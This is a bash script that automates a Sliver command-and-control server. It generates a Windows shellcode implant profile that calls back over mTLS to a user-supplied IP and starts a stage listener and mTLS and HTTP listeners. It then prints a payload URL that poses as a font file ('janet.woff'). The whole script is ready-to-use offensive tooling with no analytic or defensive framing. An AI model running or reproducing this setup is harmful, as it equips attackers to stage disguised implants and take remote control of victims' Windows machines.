#!/bin/bash

# Prompt the user for the IP address
read -p "Please enter the IP address: " ip_address

# Create an expect script to send commands to Sliver Server
expect -c "
  spawn /root/sliver-server
  set timeout 20

  expect \"sliver >\"
  send \"profiles new --mtls $ip_address --format shellcode win-shellcode\r\"

  expect \"sliver >\"
  send \"stage-listener --url http://$ip_address:80 --profile win-shellcode\r\"

  expect \"⠹  Compiling, please wait ...\"
  expect \"sliver >\"
  sleep 1
  send \"mtls\r\"

  expect \"sliver >\"
  send \"http\r\"

  interact
"

# Print the URL with the provided IP address
echo "http://$ip_address/janet.woff"

